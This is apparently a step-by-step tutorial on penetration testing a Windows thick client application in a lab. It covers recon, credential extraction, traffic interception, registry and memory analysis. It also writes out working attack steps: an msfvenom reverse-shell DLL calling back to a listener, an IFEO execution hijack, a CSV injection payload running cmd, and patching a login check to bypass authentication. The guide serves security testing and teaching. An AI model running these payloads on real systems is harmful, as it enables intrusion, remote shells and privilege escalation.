# Thick Client Penetration Testing — Practical Guide (Step-By-Step)

This guide walks through **real execution steps**, real commands, and clear visuals.
If you follow this inside a Windows VM, you’ll be able to reproduce everything.

---

# Lab Assumptions

Target application:

```text
C:\Program Files\TargetApp\target.exe
```

Windows VM with:

* Administrator access
* Sysinternals installed
* Wireshark
* x64dbg
* Ghidra or dnSpy
* Burp Suite

---

# Test Case 1 — Initial Recon & Binary Identification

---

## Step 1: Identify File Type

Open PowerShell:

```powershell
Get-Item "C:\Program Files\TargetApp\target.exe" | Format-List *
```

Check:

* Length
* CreationTime
* VersionInfo

---

## Step 2: Check if 32-bit or 64-bit

Using Sysinternals:

```powershell
sigcheck.exe "C:\Program Files\TargetApp\target.exe"
```

Or open in CFF Explorer.

ASCII View of PE Header:

```text
Machine: 0x8664  → x64
Machine: 0x014c  → x86
```

---

## Step 3: Detect Packer

Use Detect It Easy (DIE).

If packed, output may show:

```text
Packer: UPX
Compiler: Microsoft Visual C++
```

If packed → unpack before analysis.

---

# Test Case 2 — Extract Hardcoded Credentials

---

## Step 1: Extract Strings

Using Sysinternals:

```powershell
strings.exe -n 5 "C:\Program Files\TargetApp\target.exe" > output.txt
```

Open output.txt and search:

```text
password=
apikey=
server=
jdbc:mysql://
```

---

## Step 2: Search for Secrets

PowerShell:

```powershell
Select-String -Path output.txt -Pattern "password"
Select-String -Path output.txt -Pattern "key"
Select-String -Path output.txt -Pattern "token"
```

If found:

```text
db_user=admin
db_pass=Admin@123
```

That’s a finding.

---

## Step 3: .NET Decompilation (if .NET app)

Open dnSpy.

Steps:

1. File → Open → target.exe
2. Expand namespaces
3. Search (Ctrl+Shift+F) for:

```text
password
connectionString
secret
```

ASCII view:

```text
private string dbPass = "Admin@123";
```

Critical vulnerability.

---

# Test Case 3 — Analyze Network Communication

---

## Step 1: Start Wireshark

Run as Administrator.

Filter:

```text
ip.addr == 192.168.1.20
```

OR

```text
tcp.port == 443
```

---

## Step 2: Check if Traffic is Encrypted

If you see:

```text
POST /login HTTP/1.1
username=admin&password=admin
```

That’s plaintext credentials.

Critical issue.

---

## Step 3: Use Burp Suite (MITM Test)

1. Set Burp proxy to:

   ```text
   127.0.0.1:8080
   ```
2. Configure Windows proxy:

   ```text
   Internet Options → Connections → LAN → Proxy
   ```
3. Install Burp CA certificate.
4. Launch application.

If traffic visible → no certificate pinning.

If app crashes → pinning enabled.

---

# Test Case 4 — DLL Hijacking

---

## Step 1: Monitor DLL Loading

Open ProcMon.

Filter:

```text
Process Name is target.exe
Operation is CreateFile
Result is NAME NOT FOUND
```

ASCII:

```text
+------------------+------------+---------------------------+
| Process Name     | Operation  | Path                      |
+------------------+------------+---------------------------+
| target.exe       | CreateFile | C:\Program Files\xyz.dll |
| target.exe       | CreateFile | C:\Windows\xyz.dll       |
+------------------+------------+---------------------------+
```

If searching in writable directory → exploitable.

---

## Step 2: Generate Malicious DLL

Using msfvenom (Kali):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f dll > xyz.dll
```

Place xyz.dll in vulnerable directory.

---

## Step 3: Start Listener

```bash
nc -lvnp 4444
```

Launch application.

If reverse shell → successful DLL hijack.

---

# Test Case 5 — Insecure File Permissions

---

## Step 1: Check Directory Permissions

```powershell
icacls "C:\Program Files\TargetApp"
```

Look for:

```text
BUILTIN\Users:(F)
```

If users have Full control → privilege escalation possible.

---

# Test Case 6 — Registry Analysis

---

## Step 1: Take Baseline Snapshot

Download Regshot.

1. Take 1st shot.
2. Launch application.
3. Take 2nd shot.
4. Compare.

ASCII example:

```text
Added:
HKCU\Software\TargetApp\Username
HKCU\Software\TargetApp\Password
```

If password stored in plaintext → vulnerability.

---

# Test Case 7 — IFEO Injection

---

## Step 1: Open Registry

```powershell
regedit
```

Navigate:

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

Create new key:

```text
target.exe
```

Inside → create String:

```text
Debugger = calc.exe
```

Now launch target.exe.

If calculator opens → application execution hijacked.

---

# Test Case 8 — Memory Analysis

---

## Step 1: Dump Process Memory

Using Task Manager:

1. Right click target.exe
2. Create dump file

---

## Step 2: Analyze Dump

```powershell
strings.exe target.DMP > memory.txt
```

Search:

```powershell
Select-String -Path memory.txt -Pattern "password"
```

If plaintext found → sensitive data exposure.

---

# Test Case 9 — CSV Injection

If application exports CSV.

Enter as username:

```text
=cmd|' /C calc'!A0
```

Open exported CSV in Excel.

If command executes → CSV Injection confirmed.

---

# Test Case 10 — Weak TLS Configuration

From Kali:

```bash
sslscan 192.168.1.20
```

OR

```bash
sslyze 192.168.1.20
```

Check for:

```text
TLSv1.0 enabled
RC4 supported
Weak ciphers
```

---

# Test Case 11 — Local Privilege Escalation

---

## Step 1: Check Running Service

```powershell
sc qc TargetService
```

Check:

```text
BINARY_PATH_NAME
SERVICE_START_NAME
```

---

## Step 2: Check Writable Service Path

```powershell
icacls "C:\Program Files\TargetApp\service.exe"
```

If writable → replace with malicious binary.

---

# Test Case 12 — Authentication Bypass

If client validates locally:

Use dnSpy.

Find:

```text
if(password == "Admin@123")
```

Modify:

```text
if(true)
```

Recompile.

If login bypassed → client-side auth flaw.

---

# Final Validation Checklist

Before closing assessment:

* [ ] Hardcoded secrets extracted
* [ ] Network analyzed
* [ ] DLL hijack tested
* [ ] IFEO tested
* [ ] Registry checked
* [ ] Memory dump analyzed
* [ ] TLS configuration tested
* [ ] File permissions reviewed
* [ ] Authentication logic validated
* [ ] Export features tested

